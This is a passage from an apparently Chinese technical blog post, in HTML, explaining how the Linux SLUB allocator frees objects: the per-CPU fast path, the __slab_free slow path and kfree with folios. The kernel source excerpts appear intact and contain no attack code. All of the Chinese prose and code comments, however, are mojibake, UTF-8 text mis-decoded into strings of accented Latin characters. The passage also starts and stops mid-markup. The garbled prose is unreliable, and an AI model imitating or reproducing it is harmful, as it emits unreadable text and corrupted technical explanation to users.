<em><strong>å…è®¸é‡Šæ”¾å·²ç»è¿æ¥æˆä¸€æ¡ freelist ä¸”å·²ç»åŠ å¯†å¥½çš„å¤šä¸ªå¯¹è±¡</strong></em>  ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¼ºåˆ¶å†…è”å¿«é€Ÿè·¯å¾„ä»¥åˆ›é€ æ— éœ€é¢å¤–çš„å‡½æ•°è°ƒç”¨ä¾¿èƒ½å®Œæˆå¿«é€Ÿè·¯å¾„é‡Šæ”¾çš„kfree&amp;kmem_cache_free.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¿«é€Ÿè·¯å¾„ä»…åœ¨æˆ‘ä»¬è¦é‡Šæ”¾ä¼šå½“å‰ cpu slab æ—¶ç”Ÿæ•ˆ.</span><br><span class="hljs-comment"> * è¿™é€šå¸¸æ˜¯åœ¨æˆ‘ä»¬åˆšåˆšåˆ†é…äº†è¯¥å¯¹è±¡çš„æƒ…å†µ.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥å¿«é€Ÿè·¯å¾„ä¸å¯ç”¨åˆ™é€€å› __slab_free ä»¥å¤„ç†æ‰€æœ‰ç§ç±»çš„ç‰¹æ®Šå¤„ç†.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * é€šè¿‡æŒ‡å®š head &amp; tail æŒ‡é’ˆ åŠ ä¸Šå¯¹è±¡æ•°é‡ï¼ˆcntï¼‰ï¼Œå¯ä»¥å¤§é‡é‡Šæ”¾åŒ…å«å¤šä¸ªå¯¹è±¡çš„freelist.</span><br><span class="hljs-comment"> * Bulk free indicated by tail pointer being set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> <span class="hljs-title function_">do_slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> slab *slab, <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail,</span><br><span class="hljs-params"><span class="hljs-type">int</span> cnt, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br><span class="hljs-type">void</span> *tail_obj = tail ? : head;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> **freelist;<br></code></pre></td></tr></table></figure><p>ä¸åˆ†é…ç±»ä¼¼ï¼Œé‡Šæ”¾åŒæ ·åˆ†ä¸ºå¿«é€Ÿè·¯å¾„ä¸æ…¢é€Ÿè·¯å¾„</p><h3 id="I-ç›´æ¥é‡Šæ”¾å›-percpu-slabï¼ˆfast-pathï¼‰">I. ç›´æ¥é‡Šæ”¾å› percpu slabï¼ˆfast pathï¼‰</h3><p>å¿«é€Ÿè·¯å¾„æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯<strong>å¯¹æ¯”å¾…é‡Šæ”¾å¯¹è±¡æ‰€å± slab æ˜¯å¦ä¸º percpu slabï¼Œè‹¥æ˜¯åˆ™ç›´æ¥æŒ‚å›å»å³å¯ï¼Œéµå¾ª LIFO æœºåˆ¶</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c">redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç¡®å®šå½“å‰çš„ per cpu slab. </span><br><span class="hljs-comment"> * cpu å¯èƒ½åœ¨ä¹‹åæ”¹å˜.ä½†ç”±äºæ•°æ®å·²ç»é€šè¿‡è¯¥æŒ‡é’ˆè·å¾—ï¼Œè¿™å¹¶æ²¡é—®é¢˜.</span><br><span class="hljs-comment"> * è‹¥æˆ‘ä»¬åœ¨ cmpxchg æœŸé—´åœ¨åŒä¸€ cpu ä¸Šï¼Œé‡Šæ”¾å°†ä¼šæˆåŠŸ.</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/* ä¸ slab_alloc_node() ä¸­åœ¨ barrier() ä¸Šçš„æ³¨é‡Šä¸€æ · */</span><br>barrier();<br><br><span class="hljs-comment">// ä¸å±äº percpu slabï¼Œè°ƒç”¨ __slab_free() è¿›è¡Œé‡Šæ”¾</span><br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>__slab_free(s, slab, head, tail_obj, cnt, addr);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (USE_LOCKLESS_FAST_PATH()) &#123;<br>freelist = READ_ONCE(c-&gt;freelist);<br><br><span class="hljs-comment">// ç›´æ¥å°† percpu freelist æ¥åˆ° tail_obj åé¢</span><br>set_freepointer(s, tail_obj, freelist);<br><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>freelist, tid,<br>head, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_free&quot;</span>, s, tid);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Update the free list under the local lock */</span><br>local_lock(&amp;s-&gt;cpu_slab-&gt;lock);<br>c = this_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>tid = c-&gt;tid;<br>freelist = c-&gt;freelist;<br><br><span class="hljs-comment">// ç›´æ¥å°† percpu freelist æ¥åˆ° tail_obj åé¢</span><br>set_freepointer(s, tail_obj, freelist);<br>c-&gt;freelist = head;<br>c-&gt;tid = next_tid(tid);<br><br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br>&#125;<br>stat(s, FREE_FASTPATH);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-slab-free-ï¼šé‡Šæ”¾å›å¯¹åº”çš„-slabï¼ˆslow-pathï¼‰">II. __slab_free()ï¼šé‡Šæ”¾å›å¯¹åº”çš„ slabï¼ˆslow pathï¼‰</h3><p>å¦‚æœå¾…é‡Šæ”¾å¯¹è±¡ä¸å±äº percpu clabï¼Œåˆ™è°ƒç”¨ <code>__slab_free()</code> è¿›è¡Œé‡Šæ”¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¤„ç†æ…¢é€Ÿè·¯å¾„. è¿™å¯èƒ½ä¼šè¢«é¢‘ç¹è°ƒç”¨å› ä¸ºåœ¨å¤§éƒ¨åˆ†æƒ…å†µä¸‹å¯¹è±¡æ¯”cpu slabç”Ÿå‘½å‘¨æœŸæ›´é•¿</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ‰€ä»¥æˆ‘ä»¬ä»å°è¯•å‡å°‘ç¼“å­˜è¡Œçš„ä½¿ç”¨ç‡. æ‹¿å– slab lock å¹¶é‡Šæ”¾å¯¹è±¡å³å¯.</span><br><span class="hljs-comment"> * è‹¥ä¸éœ€è¦é¢å¤–çš„ partial slab handling æˆ‘ä»¬ä¾¿å¯ç«‹å³è¿”å›.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __slab_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,<br><span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">int</span> cnt,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)<br><br>&#123;<br><span class="hljs-type">void</span> *prior;<br><span class="hljs-type">int</span> was_frozen;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>stat(s, FREE_SLOWPATH);<br></code></pre></td></tr></table></figure><p>é¦–å…ˆè¿˜æ˜¯ kfence å’Œ debug ç›¸å…³ï¼Œå¦‚æœè¯¥ <code>kmem_cache</code> è®¾ç½®äº† <code>SLAB_DEBUG_FLAGS</code> æ ‡å¿—ä½åˆ™ç›´æ¥è°ƒç”¨ <code>free_to_partial_list()</code> åè¿”å›å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (kfence_free(head))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_SLUB_TINY) || kmem_cache_debug(s)) &#123;<br>free_to_partial_list(s, slab, head, tail, cnt, addr);<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åæ˜¯ä¸€ä¸ª <code>do while</code> å¾ªç¯ï¼Œé¦–å…ˆä¼šå°† <strong><code>å¾…é‡Šæ”¾ freelist æ‰€å± slab çš„ freelist</code></strong> è¿æ¥åˆ° <strong><code>å¾…é‡Šæ”¾ freelist çš„ tail object</code></strong> åè¾¹ï¼Œè¿™é‡Œçš„ <code>new</code> æ˜¯ä¸€ä¸ªæ ˆä¸Šçš„ä¸´æ—¶ slab ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (unlikely(n)) &#123;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>n = <span class="hljs-literal">NULL</span>;<br>&#125;<br>prior = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br>set_freepointer(s, tail, prior);<br>new.counters = counters;<br>was_frozen = new.frozen;<br>new.inuse -= cnt;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ£€æŸ¥æ˜¯å¦  <strong><code>(æ‰€æœ‰çš„å¯¹è±¡éƒ½*å°†*ä¸ºç©ºé—²å¯¹è±¡ || åŸ slab ä¸Šæ— ç©ºé—²å¯¹è±¡) &amp;&amp; slab æœªè¢«å†»ç»“</code></strong> ï¼Œè‹¥æ»¡è¶³è¯¥æ¡ä»¶åˆ™ï¼š</p><ul><li>æ£€æŸ¥æ˜¯å¦æœ‰ percpu partial slab ä¸”åŸ slab ä¸Šæ— ç©ºé—²å¯¹è±¡ï¼ˆå³ slab-&gt;freelistï¼ˆä¹Ÿå°±æ˜¯ä»£ç ä¸­çš„ <code>prior</code>ï¼‰ä¸º NULLï¼‰ï¼š<ul><li>è‹¥æ˜¯ï¼Œåˆ™è®¾ç½® slab å°†è¢«å†»ç»“ï¼ˆ<code>new.frozen=1</code>ï¼‰</li><li>è‹¥å¦ï¼Œåˆ™è·å– slab æ‰€å¯¹åº”çš„ <code>kmem_cache_node</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((!new.inuse || !prior) &amp;&amp; !was_frozen) &#123;<br><br><span class="hljs-keyword">if</span> (kmem_cache_has_cpu_partial(s) &amp;&amp; !prior) &#123;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab ä¹‹å‰ä¸åœ¨é“¾è¡¨ä¸Šä¸”å°†ä¼šéƒ¨åˆ†ä¸ºç©º</span><br><span class="hljs-comment"> * æˆ‘ä»¬å¯ä»¥æ¨è¿Ÿé“¾è¡¨ç§»åŠ¨ï¼Œè€Œæ˜¯åä¹‹å°†å…¶å†»ç»“.</span><br><span class="hljs-comment"> */</span><br>new.frozen = <span class="hljs-number">1</span>;<br><br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">/* éœ€è¦ä»ä¸€ä¸ªé“¾è¡¨ä¸Šå–ä¸‹ */</span><br><br>n = get_node(s, slab_nid(slab));<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ¨æµ‹æ€§åœ°è·å– list_lock.</span><br><span class="hljs-comment"> * è‹¥ cmpxchg æœªæˆåŠŸï¼Œåˆ™æˆ‘ä»¬å¯èƒ½</span><br><span class="hljs-comment"> * åœ¨ä¸è¿›è¡Œä»»ä½•å¤„ç†çš„æƒ…å†µä¸‹æ”¾å¼ƒ list_lock.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¦åˆ™ list_lock å°†ä¸å…¶ä»–å¤„ç†å™¨åŒæ­¥æ›´æ–° slabs é“¾è¡¨</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾ªç¯çš„ç»ˆæ­¢æ¡ä»¶ç”¨äº†ä¸€ä¸ª <code>cmpxchg_double_slab()</code> å‡½æ•°ï¼Œ<s>å¥—å¨ƒå¥—å¾—ğŸ‘´å¤´æ˜çœ¼èŠ±</s>ï¼Œä¸»è¦é€»è¾‘ä¸ºï¼š</p><ul><li><strong>å¯¹æ¯” slab-&gt;freelist == prior &amp;&amp; slab-&gt;counters == countersï¼Œè‹¥æ˜¯ï¼Œåˆ™å°† slab-&gt;freelist è®¾ä¸º head ä¸”å°† slab-&gt;counters è®¾ä¸º new.counters</strong>ï¼Œè¯¥æ“ä½œæˆåŠŸåˆ™è¿”å› trueï¼Œæ¡ä»¶ä¸ç¬¦åˆ™è¿”å› false</li></ul><p>æˆåŠŸäº†å¾ªç¯å°†ä¼šç›´æ¥è·³å‡ºï¼šï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">while</span> (!cmpxchg_double_slab(s, slab,<br>prior, counters,<br>head, new.counters,<br><span class="hljs-string">&quot;__slab_free&quot;</span>));<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ£€æŸ¥**è¯¥ slab æ˜¯å¦éœ€è¦ä»ä¸€ä¸ª <code>kmem_cache_node</code> çš„é“¾è¡¨ä¸Šå–ä¸‹ï¼Œè‹¥å¦ï¼Œ**åˆ™ï¼š</p><ul><li>è‹¥ slab å·²ç»è¢«å†»ç»“ï¼Œstat() ä¸€ä¸‹ï¼ˆåŸºæœ¬ä¸Šç­‰äºå•¥éƒ½ä¸åšï¼‰</li><li>è‹¥ slab éœ€è¦è¢«å†»ç»“ ï¼ˆ<code>new.frozen</code> ä¸º trueï¼‰ï¼Œè°ƒç”¨ <code>put_cpu_partial()</code> ç›´æ¥å°† slab æ”¾åˆ° percpu partial é“¾è¡¨</li><li>é‡Šæ”¾å·¥ä½œå®Œæˆï¼Œè¿”å›</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (likely(!n)) &#123;<br><br><span class="hljs-keyword">if</span> (likely(was_frozen)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é“¾è¡¨é”æœªè¢«å ç”¨ï¼Œå› æ­¤ä¸éœ€è¦æ´»è·ƒä»»ä½•é“¾è¡¨.</span><br><span class="hljs-comment"> */</span><br>stat(s, FREE_FROZEN);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.frozen) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we just froze the slab then put it onto the</span><br><span class="hljs-comment"> * per cpu partial list.</span><br><span class="hljs-comment"> */</span><br>put_cpu_partial(s, slab, <span class="hljs-number">1</span>);<br>stat(s, CPU_PARTIAL_FREE);<br>&#125;<br><br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœ slab ä¸Šæ‰€æœ‰å¯¹è±¡éƒ½è¢«é‡Šæ”¾ï¼Œä¸” node ä¸Šçš„ partial slab æ•°é‡å·²ç»è¶…è¿‡ <code>kmem_cache-&gt;min_partial</code> ï¼Œ<strong>è¿™æ„å‘³ç€è¿™æ˜¯ä¸€å¼ å®Œå…¨ç©ºé—²çš„ slab</strong>ï¼Œæ¥ä¸‹æ¥è·³è½¬åˆ° <code>slab_empty</code> æ ‡ç­¾ï¼Œè¯¥æ ‡ç­¾å¯¹åº”ä»£ç å—ä¸»è¦æ˜¯ï¼š</p><ul><li>è‹¥ slab ä¸ŠåŸæ¥æœ‰ç©ºé—²å¯¹è±¡ï¼ˆä½äº node partial é“¾è¡¨ï¼‰ï¼Œåˆ™ä» partial é“¾è¡¨ç§»é™¤</li><li>è‹¥ slab ä¸ŠåŸæ¥æ— ç©ºé—²å¯¹è±¡ï¼ˆä½äº node full é“¾è¡¨ï¼‰ï¼Œåˆ™ä» full é“¾è¡¨ç§»é™¤</li><li><strong>æœ€åè°ƒç”¨ <code>discard_slab()</code> é‡Šæ”¾è¿™ä¸€å¼  slab</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unlikely(!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))<br><span class="hljs-keyword">goto</span> slab_empty;<br><br><span class="hljs-comment">//...</span><br><br>slab_empty:<br><span class="hljs-keyword">if</span> (prior) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab on the partial list.</span><br><span class="hljs-comment"> */</span><br>remove_partial(n, slab);<br>stat(s, FREE_REMOVE_PARTIAL);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Slab must be on the full list */</span><br>remove_full(s, n, slab);<br>&#125;<br><br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, FREE_SLAB);<br>discard_slab(s, slab);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è‹¥ä¸æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶ï¼Œåˆ™æ£€æŸ¥æ˜¯å¦æ²¡æœ‰ percpu partial slab ä¸” slab ä¸ŠåŸ freelist ä¸º NULLï¼ˆå³ä½äº node full é“¾è¡¨ï¼‰ï¼Œè‹¥æ˜¯åˆ™ä» full é“¾è¡¨ç§»é™¤å¹¶æ·»åŠ åˆ° node partial é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Objects left in the slab. If it was not on the partial list before</span><br><span class="hljs-comment"> * then add it.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) &#123;<br>remove_full(s, n, slab);<br>add_partial(n, slab, DEACTIVATE_TO_TAIL);<br>stat(s, FREE_ADD_PARTIAL);<br>&#125;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œ slub ç®—æ³•çš„é‡Šæ”¾é€»è¾‘åˆ†æå®Œæ¯•</p><h2 id="äºŒã€kfreeï¼šé€šç”¨çš„ä¸Šå±‚é‡Šæ”¾æ¥å£">äºŒã€kfreeï¼šé€šç”¨çš„ä¸Šå±‚é‡Šæ”¾æ¥å£</h2><p>æ­£å¦‚åŒ <code>kmalloc()</code> æ˜¯æœ€ä¸ºé€šç”¨çš„å†…æ ¸å¯¹è±¡åˆ†é…å‡½æ•°ï¼Œä¸ä¹‹ç›¸å¯¹åº”çš„é‡Šæ”¾å‡½æ•°ä¾¿æ˜¯ <code>kfree()</code> äº†ï¼Œè¿™ä¸ªå‡½æ•°å…¶å®ä¸»è¦å°±æ˜¯ <code>__kmem_cache_free()</code> çš„ wrapperï¼Œå¯¹äºè¾ƒå¤§çš„å¯¹è±¡åˆ™ä¼šç”¨ <code>free_large_kmalloc()</code> è¿›è¡Œé‡Šæ”¾ï¼Œå¦‚æœ object ä¸º NULL åˆ™ç›´æ¥è¿”å›ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kfree - é‡Šæ”¾ä¹‹å‰åˆ†é…çš„å¯¹è±¡</span><br><span class="hljs-comment"> * @object: kmalloc è¿”å›çš„æŒ‡é’ˆ.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥ @object ä¸º NULL, åˆ™ä¸ä¼šè¿›è¡Œä»»ä½•æ“ä½œ.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä¸è¦é‡Šæ”¾ä¸ç”± kmalloc() åˆ†é…çš„å†…å­˜ï¼Œå¦åˆ™ä¼šå‡ºé—®é¢˜.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">folio</span> *<span class="hljs-title">folio</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span>;</span><br><br>trace_kfree(_RET_IP_, object);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(object)))<br><span class="hljs-keyword">return</span>;<br><br>folio = virt_to_folio(object);<br><span class="hljs-keyword">if</span> (unlikely(!folio_test_slab(folio))) &#123;<br>free_large_kmalloc(folio, (<span class="hljs-type">void</span> *)object);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>slab = folio_slab(folio);<br>s = slab-&gt;slab_cache;<br>__kmem_cache_free(s, (<span class="hljs-type">void</span> *)object, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(kfree);<br></code></pre></td></tr></table></figure><h3 id="I-folio-ç»“æ„ï¼šä¸€æ®µç‰©ç†ã€è™šæ‹Ÿã€é€»è¾‘ä¸Šéƒ½è¿ç»­çš„å†…å­˜">I. folio ç»“æ„ï¼šä¸€æ®µç‰©ç†ã€è™šæ‹Ÿã€é€»è¾‘ä¸Šéƒ½è¿ç»­çš„å†…å­˜</h3><p>æ³¨æ„åˆ°è¿™é‡Œç”¨äº†ä¸€ä¸ªåä¸º <code>folio</code> çš„ç»“æ„ä½“ï¼Œå…¶è¡¨ç¤ºäº†<strong>ä¸€å—ç‰©ç†ã€è™šæ‹Ÿã€é€»è¾‘ä¸Šéƒ½è¿ç»­çš„å†…å­˜</strong>ï¼Œ  <em>å…¶å®æœ¬è´¨ä¸Šè¿˜æ˜¯å¤ç”¨äº† page ç»“æ„ä½“ï¼Œåªä¸è¿‡è¿™ä¸€æ¬¡æ˜¯å°† page è½¬ä¸º folio</em>  ï¼Œå®šä¹‰æ¯”è¾ƒé•¿è¿™é‡Œå°±ä¸è´´ä»£ç äº†</p><p><code>virt_to_folio()</code> é¦–å…ˆä¼šç”¨ <code>virt_to_page()</code> æ‰¾åˆ°å¾…é‡Šæ”¾å¯¹è±¡è™šæ‹Ÿåœ°å€å¯¹åº”çš„ <code>page</code> ç»“æ„ä½“ï¼Œä¹‹åç”¨ <code>page_folio()</code> å°†å…¶è½¬æ¢ä¸º folio ç»“æ„ä½“â€”â€”å…¶å®å°±æ˜¯å¯¹äºå¤åˆé¡µè€Œè¨€ä¼šæ‰¾åˆ°ç¬¬ä¸€å¼ é¡µé¢ï¼Œç”±æ­¤å¦‚æœæ˜¯å¤åˆé¡µçš„è¯é‚£è¯´æ˜æ˜¯å¤§ slab æ‰€ä»¥ä¼šè°ƒç”¨ <code>free_large_kmalloc()</code>ï¼Œä¸æ˜¯å¤åˆé¡µè¯´æ˜æ˜¯å° slab æ‰€ä»¥ä¼šè°ƒç”¨ <code>__kmem_cache_free()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span 